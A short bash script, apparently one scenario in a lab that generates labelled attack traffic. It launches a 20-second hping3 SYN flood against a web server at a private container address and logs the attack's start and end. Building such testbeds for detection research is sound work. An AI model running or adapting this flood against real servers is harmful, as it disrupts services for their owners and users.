#!/usr/bin/env bash
# Scenar 2: DoS - SYN flood na web server (limitovane na 20s, aby sme
# nepretazili hostitelsky stroj)
set -e
source /scripts/attacks/lib.sh

SCENARIO="dos_synflood"
log_event "$SCENARIO" "start" "\"attack_category\":\"dos\",\"src_ip\":\"172.28.0.20\",\"dst_ip\":\"172.28.0.10\",\"tool\":\"hping3\""

timeout 20 hping3 -S -p 80 --flood 172.28.0.10 || true

log_event "$SCENARIO" "end"
